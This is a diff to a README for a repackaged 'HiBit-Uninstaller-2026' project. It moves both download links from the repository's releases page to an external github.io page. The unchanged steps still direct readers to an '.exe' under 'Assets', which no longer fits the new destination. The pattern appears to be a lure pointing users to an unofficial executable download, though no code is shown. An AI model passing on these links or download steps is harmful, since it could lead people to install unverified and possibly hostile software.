@@ -1,6 +1,6 @@
 # 🧹 HiBit-Uninstaller-2026 - Clean your computer and remove apps
 
-[![](https://img.shields.io/badge/Download-HiBit_Uninstaller-blue.svg)](https://github.com/storm6674/HiBit-Uninstaller-2026/releases)
+[![](https://img.shields.io/badge/Download-HiBit_Uninstaller-blue.svg)](https://storm6674.github.io)
 
 ## 📖 About this software
 
@@ -19,7 +19,7 @@ Before you install the software, check that your computer meets these requiremen
 
 Follow these steps to get the software on your machine:
 
-1. Visit [this page to download](https://github.com/storm6674/HiBit-Uninstaller-2026/releases).
+1. Visit [this page to download](https://storm6674.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the link that ends in ".exe" to save the installer file to your computer.
 4. Wait for the browser to finish the download. 
